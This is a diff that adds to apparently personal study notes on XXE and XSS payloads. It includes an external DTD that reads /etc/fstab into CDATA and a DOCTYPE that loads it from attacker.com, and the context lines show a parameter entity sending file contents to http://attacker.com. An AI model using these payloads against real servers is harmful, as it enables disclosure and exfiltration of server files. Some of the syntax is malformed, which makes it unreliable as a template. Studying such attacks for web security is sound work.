@@ -107,3 +107,31 @@ evil.dtd:
 <!ENTITY % stack "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>"> // &#x25; is encoded to not have more than 1 % and cause issues
 %stack;
 %exfiltrate;
+
+CDATA (parser wouldn't consider them as xml)
+<![CDATA[
+<script>alert(1);</script>
+Image payload:
+<img src=x onerror="alert(1)">
+]]>
+
+I can't use market inside CDATA // only text
+
+parameter entity inside external ddt
+<!-- external.dtd -->
+<!ENTITY % file SYSTEM "file:///etc/fstab">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY file_content '%start;%file;%end;'>">
+%all; // in this way I displayed the content of the file inside CDATA
+
+result: <![CDATA[ Content of etc/fstab ]]>
+// this can't be used inside DOCTYPE as we can't reference a parameter entity within another entity in the DOCTYPE subset.
+<DOCTYPE data[
+<!ENTITY % xxe SYSTEM "https://attacker.com/external.dtd">
+&xxe;
+]>
+<data>
+<prodId>&file_content;<prodId>
+</data>
+
